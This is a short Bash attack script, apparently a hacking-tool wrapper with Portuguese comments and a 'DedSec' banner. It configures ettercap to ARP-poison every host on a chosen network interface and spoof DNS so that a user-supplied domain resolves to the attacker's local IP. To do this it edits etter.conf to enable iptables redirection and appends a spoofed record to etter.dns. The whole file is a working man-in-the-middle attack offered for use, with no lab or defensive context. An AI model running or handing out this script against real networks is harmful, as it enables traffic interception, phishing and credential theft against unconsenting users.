#!/bin/bash

# Exibe o banner
echo "  _____           _  _____           "
echo " |  __ \         | |/ ____|          "
echo " | |  | | ___  __| | (___   ___  ___ "
echo " | |  | |/ _ \/ _' |\___ \ / _ \/ __|"
echo " | |__| |  __/ (_| |____) |  __/ (__ "
echo " |_____/ \___|\__,_|_____/ \___|\___|"
echo "                                     "

# Solicita a entrada do usuário para URL, IP local e interface de rede
read -p "Digite a URL que deseja redirecionar: " url
read -p "Digite o IP local para onde deseja redirecionar: " iplocal
read -p "Digite a interface de rede (exemplo: eth0, wlan0): " iface

# Verifica se o etter.conf existe e descomenta a linha que permite o redirecionamento
if [ -f /usr/local/etc/etter.conf ]; then
    sed -i 's/#redir_command_on = \"iptables/redir_command_on = \"iptables/g' /usr/local/etc/etter.conf
    sed -i 's/#redir_command_off = \"iptables/redir_command_off = \"iptables/g' /usr/local/etc/etter.conf
    echo "Linhas de redirecionamento descomentadas em /usr/local/etc/etter.conf"
else
    echo "Arquivo etter.conf não encontrado!"
    exit 1
fi

# Adiciona a URL e IP ao arquivo etter.dns
echo "$url A $iplocal" >> /usr/local/share/etter.dns
echo "Redirecionamento DNS adicionado ao arquivo /usr/local/share/etter.dns"

# Executa o ettercap com as opções fornecidas
ettercap -T -Q -i "$iface" -M arp -P dns_spoof // //
